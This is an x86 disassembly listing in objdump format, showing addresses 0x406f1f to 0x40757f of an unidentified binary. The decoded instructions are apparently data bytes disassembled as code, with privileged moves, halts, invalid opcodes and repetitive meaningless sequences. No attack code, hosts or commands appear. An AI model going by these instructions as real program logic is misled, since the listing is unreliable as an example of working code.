  406f1f:	04 49                	add    $0x49,%al
  406f21:	02 45 20             	add    0x20(%ebp),%al
  406f24:	9f                   	lahf
  406f25:	01 19                	add    %ebx,(%ecx)
  406f27:	00 84 18 d6 04 c1 00 	add    %al,0xc104d6(%eax,%ebx,1)
  406f2e:	70 11                	jo     0x406f41
  406f30:	de 04 59             	fiadds (%ecx,%ebx,2)
  406f33:	02 d9                	add    %cl,%bl
  406f35:	1e                   	push   %ds
  406f36:	2b 02                	sub    (%edx),%eax
  406f38:	c1 00 c6             	roll   $0xc6,(%eax)
  406f3b:	1a 15 02 c1 00 19    	sbb    0x1900c102,%dl
  406f41:	16                   	push   %ss
  406f42:	0e                   	push   %cs
  406f43:	00 61 02             	add    %ah,0x2(%ecx)
  406f46:	b4 22                	mov    $0x22,%ah
  406f48:	9a 00 71 02 3b 22 0a 	lcall  $0xa22,$0x3b027100
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	be 1f c7 00 a1       	mov    $0xa100c71f,%esi
  406f57:	02 b6 10 01 05 79    	add    0x79050110(%esi),%dh
  406f5d:	02 d9                	add    %cl,%bl
  406f5f:	1e                   	push   %ds
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 82 21 07 05 81    	add    -0x7efaf8df(%edx),%al
  406f69:	02 bb 0f 0d 05 a9    	add    -0x56faf2f1(%ebx),%bh
  406f6f:	02 04 10             	add    (%eax,%edx,1),%al
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 59 10 47    	add    0x47105902(%ecx),%dh
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 a3 26 16 04 81    	add    %esp,-0x7efbe9da(%ebx)
  406f81:	02 d9                	add    %cl,%bl
  406f83:	1f                   	pop    %ds
  406f84:	13 05 81 02 7f 18    	adc    0x187f0281,%eax
  406f8a:	0e                   	push   %cs
  406f8b:	00 89 02 d9 1e 0e    	add    %cl,0xe1ed902(%ecx)
  406f91:	00 89 02 11 10 6b    	add    %cl,0x6b101102(%ecx)
  406f97:	01 b1 02 fb 0f 47    	add    %esi,0x470ffb02(%ecx)
  406f9d:	02 a1 02 14 1a c7    	add    -0x38e5ebfe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 fb                	add    %edi,%ebx
  406fa7:	21 1a                	and    %ebx,(%edx)
  406fa9:	05 89 02 b1 21       	add    $0x21b10289,%eax
  406fae:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb1:	02 d8                	add    %al,%bl
  406fb3:	0f 20 05             	mov    %cr0,%ebp
  406fb6:	89 02                	mov    %eax,(%edx)
  406fb8:	28 25 4b 02 81 02    	sub    %ah,0x281024b
  406fbe:	08 24 27             	or     %ah,(%edi,%eiz,1)
  406fc1:	05 c1 02 20 1e       	add    $0x1e2002c1,%eax
  406fc6:	30 05 c9 02 26 11    	xor    %al,0x112602c9
  406fcc:	c7 00 91 02 f3 25    	movl   $0x25f30291,(%eax)
  406fd2:	35 05 c1 01 fb       	xor    $0xfb01c105,%eax
  406fd7:	21 3f                	and    %edi,(%edi)
  406fd9:	05 91 02 3b 13       	add    $0x133b0291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 cc 21       	add    $0x21cc02d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	60                   	pusha
  406fe9:	11 3e                	adc    %edi,(%esi)
  406feb:	01 e1                	add    %esp,%ecx
  406fed:	02 d9                	add    %cl,%bl
  406fef:	1e                   	push   %ds
  406ff0:	4c                   	dec    %esp
  406ff1:	05 d9 02 38 20       	add    $0x203802d9,%eax
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 1e 10 c3       	mov    0xc3101e02,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 fb                	add    %edi,%ebx
  407001:	21 01                	and    %eax,(%ecx)
  407003:	05 99 02 d9 1e       	add    $0x1ed90299,%eax
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 ac 10 6b 01 a1 02 	add    0x2a1016b(%eax,%edx,1),%ch
  407012:	32 16                	xor    (%esi),%dl
  407014:	c3                   	ret
  407015:	00 a1 02 2e 10 c7    	add    %ah,-0x38efd1fe(%ecx)
  40701b:	00 89 02 61 15 4b    	add    %cl,0x4b156102(%ecx)
  407021:	02 89 02 ff 12 4b    	add    0x4b12ff02(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	16                   	push   %ss
  40702b:	24 3e                	and    $0x3e,%al
  40702d:	01 59 01             	add    %ebx,0x1(%ecx)
  407030:	7a 26                	jp     0x407058
  407032:	c3                   	ret
  407033:	00 a1 02 db 23 c7    	add    %ah,-0x38dc24fe(%ecx)
  407039:	00 f9                	add    %bh,%cl
  40703b:	02 d9                	add    %cl,%bl
  40703d:	1e                   	push   %ds
  40703e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  407041:	02 75 13             	add    0x13(%ebp),%dh
  407044:	23 02                	and    (%edx),%eax
  407046:	01 03                	add    %eax,(%ebx)
  407048:	d9 1e                	fstps  (%esi)
  40704a:	0e                   	push   %cs
  40704b:	00 01                	add    %al,(%ecx)
  40704d:	03 4a 10             	add    0x10(%edx),%ecx
  407050:	47                   	inc    %edi
  407051:	02 c1                	add    %cl,%al
  407053:	01 57 1e             	add    %edx,0x1e(%edi)
  407056:	47                   	inc    %edi
  407057:	02 c1                	add    %cl,%al
  407059:	01 fa                	add    %edi,%edx
  40705b:	20 42 02             	and    %al,0x2(%edx)
  40705e:	09 03                	or     %eax,(%ebx)
  407060:	d9 1e                	fstps  (%esi)
  407062:	6b 01 09             	imul   $0x9,(%ecx),%eax
  407065:	03 4b 22             	add    0x22(%ebx),%ecx
  407068:	6a 05                	push   $0x5
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	c1 1e 70             	rcrl   $0x70,(%esi)
  40706f:	05 19 03 79 23       	add    $0x23790319,%eax
  407074:	76 05                	jbe    0x40707b
  407076:	21 03                	and    %eax,(%ebx)
  407078:	23 19                	and    (%ecx),%ebx
  40707a:	7c 05                	jl     0x407081
  40707c:	c1 01 d4             	roll   $0xd4,(%ecx)
  40707f:	22 47 02             	and    0x2(%edi),%al
  407082:	19 03                	sbb    %eax,(%ebx)
  407084:	5c                   	pop    %esp
  407085:	24 bf                	and    $0xbf,%al
  407087:	01 81 02 34 0f 86    	add    %eax,-0x79f0cbfe(%ecx)
  40708d:	05 29 03 49 00       	add    $0x490329,%eax
  407092:	f4                   	hlt
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	c8 23 7b 00          	enter  $0x7b23,$0x0
  40709a:	59                   	pop    %ecx
  40709b:	01 66 10             	add    %esp,0x10(%esi)
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	3a 10                	cmp    (%eax),%dl
  4070a4:	c3                   	ret
  4070a5:	00 59 01             	add    %bl,0x1(%ecx)
  4070a8:	30 1a                	xor    %bl,(%edx)
  4070aa:	93                   	xchg   %eax,%ebx
  4070ab:	05 c1 01 fb 21       	add    $0x21fb01c1,%eax
  4070b0:	99                   	cltd
  4070b1:	05 49 03 d9 1e       	add    $0x1ed90349,%eax
  4070b6:	0e                   	push   %cs
  4070b7:	00 61 01             	add    %ah,0x1(%ecx)
  4070ba:	6d                   	insl   (%dx),%es:(%edi)
  4070bb:	03 cd                	add    %ebp,%ecx
  4070bd:	03 51 03             	add    0x3(%ecx),%edx
  4070c0:	02 16                	add    (%esi),%dl
  4070c2:	75 01                	jne    0x4070c5
  4070c4:	69 00 d9 1e 0e 00    	imul   $0xe1ed9,(%eax),%eax
  4070ca:	21 02                	and    %eax,(%edx)
  4070cc:	f9                   	stc
  4070cd:	14 70                	adc    $0x70,%al
  4070cf:	01 69 00             	add    %ebp,0x0(%ecx)
  4070d2:	df 0d aa 05 c1 01    	fisttps 0x1c105aa
  4070d8:	26 15 b0 05 c1 01    	es adc $0x1c105b0,%eax
  4070de:	18 1e                	sbb    %bl,(%esi)
  4070e0:	47                   	inc    %edi
  4070e1:	02 c1                	add    %cl,%al
  4070e3:	01 3a                	add    %edi,(%edx)
  4070e5:	0e                   	push   %cs
  4070e6:	bd 05 59 01 2c       	mov    $0x2c015905,%ebp
  4070eb:	19 1d 00 61 03 f9    	sbb    %ebx,0xf9036100
  4070f1:	14 47                	adc    $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	1f                   	pop    %ds
  4070f7:	16                   	push   %ss
  4070f8:	c3                   	ret
  4070f9:	00 b1 02 8a 10 c3    	add    %dh,-0x3cef75fe(%ecx)
  4070ff:	05 59 03 9c 10       	add    $0x109c0359,%eax
  407104:	c3                   	ret
  407105:	05 59 03 f9 14       	add    $0x14f90359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	85 23                	test   %esp,(%ebx)
  407110:	c9                   	leave
  407111:	05 79 03 d9 1e       	add    $0x1ed90379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 9f 0f       	add    $0xf9f0379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 12 11       	add    $0x111200c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 12                	add    %dl,(%edx)
  407127:	11 0e                	adc    %ecx,(%esi)
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 d9                	add    %ecx,%ebx
  40712d:	1e                   	push   %ds
  40712e:	36 02 0c 00          	add    %ss:(%eax,%eax,1),%cl
  407132:	d9 1e                	fstps  (%esi)
  407134:	0e                   	push   %cs
  407135:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407138:	47                   	inc    %edi
  407139:	0c f5                	or     $0xf5,%al
  40713b:	05 0c 00 be 23       	add    $0x23be000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	c2 25 fb             	ret    $0xfb25
  407147:	05 c1 01 0f 1a       	add    $0x1a0f01c1,%eax
  40714c:	01 06                	add    %eax,(%esi)
  40714e:	51                   	push   %ecx
  40714f:	00 47 21             	add    %al,0x21(%edi)
  407152:	11 06                	adc    %eax,(%esi)
  407154:	51                   	push   %ecx
  407155:	00 c7                	add    %al,%bh
  407157:	01 17                	add    %edx,(%edi)
  407159:	06                   	push   %es
  40715a:	59                   	pop    %ecx
  40715b:	00 b4 0c 17 06 89 03 	add    %dh,0x3890617(%esp,%ecx,1)
  407162:	97                   	xchg   %eax,%edi
  407163:	26 1d 06 69 00 d9    	es sbb $0xd9006906,%eax
  407169:	1e                   	push   %ds
  40716a:	01 03                	add    %eax,(%ebx)
  40716c:	61                   	popa
  40716d:	00 d9                	add    %bl,%cl
  40716f:	1e                   	push   %ds
  407170:	2d 06 91 03 12       	sub    $0x12039106,%eax
  407175:	11 0e                	adc    %ecx,(%esi)
  407177:	00 99 03 d9 1e 56    	add    %bl,0x561ed903(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 7a 14             	add    0x14(%edx),%edi
  407182:	35 06 81 02 6f       	xor    $0x6f028106,%eax
  407187:	0e                   	push   %cs
  407188:	0a 00                	or     (%eax),%al
  40718a:	91                   	xchg   %eax,%ecx
  40718b:	02 e6                	add    %dh,%ah
  40718d:	25 35 05 91 02       	and    $0x2910535,%eax
  407192:	3b 13                	cmp    (%ebx),%edx
  407194:	43                   	inc    %ebx
  407195:	06                   	push   %es
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	e1 0e                	loope  0x4071a8
  40719a:	47                   	inc    %edi
  40719b:	02 91 02 e6 25 54    	add    0x5425e602(%ecx),%dl
  4071a1:	06                   	push   %es
  4071a2:	91                   	xchg   %eax,%ecx
  4071a3:	02 32                	add    (%edx),%dh
  4071a5:	13 7c 05 91          	adc    -0x6f(%ebp,%eax,1),%edi
  4071a9:	02 26                	add    (%esi),%ah
  4071ab:	13 6b 01             	adc    0x1(%ebx),%ebp
  4071ae:	91                   	xchg   %eax,%ecx
  4071af:	02 f3                	add    %bl,%dh
  4071b1:	25 5e 06 91 02       	and    $0x291065e,%eax
  4071b6:	c5 0e                	lds    (%esi),%ecx
  4071b8:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071bb:	00 47 0c             	add    %al,0xc(%edi)
  4071be:	f5                   	cmc
  4071bf:	05 b9 03 1f 24       	add    $0x241f03b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	c1 1e 92             	rcrl   $0x92,(%esi)
  4071cb:	06                   	push   %es
  4071cc:	24 00                	and    $0x0,%al
  4071ce:	79 23                	jns    0x4071f3
  4071d0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4071d1:	06                   	push   %es
  4071d2:	1c 00                	sbb    $0x0,%al
  4071d4:	60                   	pusha
  4071d5:	13 a9 06 24 00 5c    	adc    0x5c002406(%ecx),%ebp
  4071db:	24 bf                	and    $0xbf,%al
  4071dd:	01 c9                	add    %ecx,%ecx
  4071df:	03 fd                	add    %ebp,%edi
  4071e1:	19 b3 06 c9 03 42    	sbb    %esi,0x4203c906(%ebx)
  4071e7:	0c b9                	or     $0xb9,%al
  4071e9:	06                   	push   %es
  4071ea:	d1 03                	roll   $1,(%ebx)
  4071ec:	e9 10 c1 06 e1       	jmp    0xe1473301
  4071f1:	03 42 0e             	add    0xe(%edx),%eax
  4071f4:	c8 06 d9 03          	enter  $0xd906,$0x3
  4071f8:	74 0f                	je     0x407209
  4071fa:	cf                   	iret
  4071fb:	06                   	push   %es
  4071fc:	f1                   	int1
  4071fd:	03 41 11             	add    0x11(%ecx),%eax
  407200:	d8 06                	fadds  (%esi)
  407202:	01 04 19             	add    %eax,(%ecx,%ebx,1)
  407205:	1d e2 06 2c 00       	sbb    $0x2c06e2,%eax
  40720a:	41                   	inc    %ecx
  40720b:	11 17                	adc    %edx,(%edi)
  40720d:	07                   	pop    %es
  40720e:	2c 00                	sub    $0x0,%al
  407210:	5a                   	pop    %edx
  407211:	22 23                	and    (%ebx),%ah
  407213:	07                   	pop    %es
  407214:	34 00                	xor    $0x0,%al
  407216:	fb                   	sti
  407217:	0e                   	push   %cs
  407218:	3b 07                	cmp    (%edi),%eax
  40721a:	1c 00                	sbb    $0x0,%al
  40721c:	d9 1e                	fstps  (%esi)
  40721e:	0e                   	push   %cs
  40721f:	00 c1                	add    %al,%cl
  407221:	01 d5                	add    %edx,%ebp
  407223:	26 84 00             	test   %al,%es:(%eax)
  407226:	21 04 d9             	and    %eax,(%ecx,%ebx,8)
  407229:	1e                   	push   %ds
  40722a:	6b 01 19             	imul   $0x19,(%ecx),%eax
  40722d:	04 d9                	add    $0xd9,%al
  40722f:	1e                   	push   %ds
  407230:	59                   	pop    %ecx
  407231:	07                   	pop    %es
  407232:	29 04 45 20 61 07 51 	sub    %eax,0x51076120(,%eax,2)
  407239:	01 db                	add    %ebx,%ebx
  40723b:	14 93                	adc    $0x93,%al
  40723d:	01 49 04             	add    %ecx,0x4(%ecx)
  407240:	d9 1e                	fstps  (%esi)
  407242:	6b 01 59             	imul   $0x59,(%ecx),%eax
  407245:	02 d9                	add    %cl,%bl
  407247:	1e                   	push   %ds
  407248:	0e                   	push   %cs
  407249:	00 31                	add    %dh,(%ecx)
  40724b:	04 d9                	add    $0xd9,%al
  40724d:	1e                   	push   %ds
  40724e:	0e                   	push   %cs
  40724f:	00 51 04             	add    %dl,0x4(%ecx)
  407252:	ca 13 01             	lret   $0x113
  407255:	03 51 04             	add    0x4(%ecx),%edx
  407258:	67 13 01             	adc    (%bx,%di),%eax
  40725b:	03 51 04             	add    0x4(%ecx),%edx
  40725e:	51                   	push   %ecx
  40725f:	0e                   	push   %cs
  407260:	7a 07                	jp     0x407269
  407262:	51                   	push   %ecx
  407263:	04 6e                	add    $0x6e,%al
  407265:	14 81                	adc    $0x81,%al
  407267:	07                   	pop    %es
  407268:	51                   	push   %ecx
  407269:	04 de                	add    $0xde,%al
  40726b:	25 2b 02 51 04       	and    $0x451022b,%eax
  407270:	94                   	xchg   %eax,%esp
  407271:	08 0e                	or     %cl,(%esi)
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	fe                   	(bad)
  407277:	1e                   	push   %ds
  407278:	88 07                	mov    %al,(%edi)
  40727a:	39 04 d9             	cmp    %eax,(%ecx,%ebx,8)
  40727d:	1e                   	push   %ds
  40727e:	8e 07                	mov    (%edi),%es
  407280:	51                   	push   %ecx
  407281:	04 86                	add    $0x86,%al
  407283:	08 31                	or     %dh,(%ecx)
  407285:	02 39                	add    (%ecx),%bh
  407287:	04 90                	add    $0x90,%al
  407289:	17                   	pop    %ss
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	d9 1e                	fstps  (%esi)
  407290:	2b 02                	sub    (%edx),%eax
  407292:	59                   	pop    %ecx
  407293:	02 c2                	add    %dl,%al
  407295:	25 31 02 51 03       	and    $0x3510231,%eax
  40729a:	02 16                	add    (%esi),%dl
  40729c:	9a 07 79 04 d9 1e 6b 	lcall  $0x6b1e,$0xd9047907
  4072a3:	01 51 04             	add    %edx,0x4(%ecx)
  4072a6:	8d 08                	lea    (%eax),%ecx
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 ee                	add    $0xee,%al
  4072ad:	1e                   	push   %ds
  4072ae:	88 07                	mov    %al,(%edi)
  4072b0:	c1 00 3e             	roll   $0x3e,(%eax)
  4072b3:	16                   	push   %ss
  4072b4:	23 02                	and    (%edx),%eax
  4072b6:	81 04 67 26 be 07 91 	addl   $0x9107be26,(%edi,%eiz,2)
  4072bd:	04 b2                	add    $0xb2,%al
  4072bf:	25 d0 07 a1 04       	and    $0x4a107d0,%eax
  4072c4:	d9 1e                	fstps  (%esi)
  4072c6:	0e                   	push   %cs
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 07                	add    %eax,(%edi)
  4072cb:	22 f9                	and    %cl,%bh
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 45 20             	add    0x20(%ebp),%al
  4072d2:	99                   	cltd
  4072d3:	01 49 02             	add    %ecx,0x2(%ecx)
  4072d6:	45                   	inc    %ebp
  4072d7:	20 ab 01 a9 00 d9    	and    %ch,-0x26ff56ff(%ebx)
  4072dd:	1e                   	push   %ds
  4072de:	0e                   	push   %cs
  4072df:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072e2:	23 19                	and    (%ecx),%ebx
  4072e4:	06                   	push   %es
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	be 23 f4 01 1c       	mov    $0x1c01f423,%esi
  4072ed:	00 00                	add    %al,(%eax)
  4072ef:	1d 0e 00 c1 01       	sbb    $0x1c1000e,%eax
  4072f4:	cd 20                	int    $0x20
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 1c 13             	add    %bl,(%ebx,%edx,1)
  4072fc:	28 08                	sub    %cl,(%eax)
  4072fe:	49                   	dec    %ecx
  4072ff:	02 45 20             	add    0x20(%ebp),%al
  407302:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407303:	01 51 01             	add    %edx,0x1(%ecx)
  407306:	62 00                	bound  %eax,(%eax)
  407308:	32 08                	xor    (%eax),%cl
  40730a:	c1 01 7c             	roll   $0x7c,(%ecx)
  40730d:	19 47 02             	sbb    %eax,0x2(%edi)
  407310:	a9 04 20 11 37       	test   $0x37112004,%eax
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	62 00                	bound  %eax,(%eax)
  40731a:	3c 08                	cmp    $0x8,%al
  40731c:	51                   	push   %ecx
  40731d:	01 62 00             	add    %esp,0x0(%edx)
  407320:	41                   	inc    %ecx
  407321:	08 51 01             	or     %dl,0x1(%ecx)
  407324:	62 00                	bound  %eax,(%eax)
  407326:	46                   	inc    %esi
  407327:	08 51 01             	or     %dl,0x1(%ecx)
  40732a:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40732d:	08 41 03             	or     %al,0x3(%ecx)
  407330:	20 11                	and    %dl,(%ecx)
  407332:	52                   	push   %edx
  407333:	08 51 01             	or     %dl,0x1(%ecx)
  407336:	6b 00 57             	imul   $0x57,(%eax),%eax
  407339:	08 51 01             	or     %dl,0x1(%ecx)
  40733c:	6b 00 5c             	imul   $0x5c,(%eax),%eax
  40733f:	08 51 01             	or     %dl,0x1(%ecx)
  407342:	6b 00 61             	imul   $0x61,(%eax),%eax
  407345:	08 51 01             	or     %dl,0x1(%ecx)
  407348:	1a 0f                	sbb    (%edi),%cl
  40734a:	68 08 b1 04 20       	push   $0x2004b108
  40734f:	11 6d 08             	adc    %ebp,0x8(%ebp)
  407352:	49                   	dec    %ecx
  407353:	02 45 20             	add    0x20(%ebp),%al
  407356:	7a 08                	jp     0x407360
  407358:	59                   	pop    %ecx
  407359:	03 71 26             	add    0x26(%ecx),%esi
  40735c:	23 02                	and    (%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	d9 1e                	fstps  (%esi)
  407362:	88 08                	mov    %cl,(%eax)
  407364:	c1 00 13             	roll   $0x13,(%eax)
  407367:	13 f4                	adc    %esp,%esi
  407369:	01 89 01 d9 1e 6b    	add    %ecx,0x6b1ed901(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	73 00                	jae    0x407374
  407374:	b6 08                	mov    $0x8,%dh
  407376:	49                   	dec    %ecx
  407377:	02 91 0f bd 08 49    	add    0x4908bd0f(%ecx),%dl
  40737d:	02 1a                	add    (%edx),%bl
  40737f:	0f c4 08 49          	pinsrw $0x49,(%eax),%mm1
  407383:	02 40 00             	add    0x0(%eax),%al
  407386:	cb                   	lret
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	62 00                	bound  %eax,(%eax)
  40738c:	d2 08                	rorb   %cl,(%eax)
  40738e:	49                   	dec    %ecx
  40738f:	02 7c 00 d9          	add    -0x27(%eax,%eax,1),%bh
  407393:	08 49 02             	or     %cl,0x2(%ecx)
  407396:	6b 00 e0             	imul   $0xffffffe0,(%eax),%eax
  407399:	08 49 02             	or     %cl,0x2(%ecx)
  40739c:	45                   	inc    %ebp
  40739d:	20 12                	and    %dl,(%edx)
  40739f:	09 d1                	or     %edx,%ecx
  4073a1:	04 d9                	add    $0xd9,%al
  4073a3:	1e                   	push   %ds
  4073a4:	28 09                	sub    %cl,(%ecx)
  4073a6:	09 00                	or     %eax,(%eax)
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
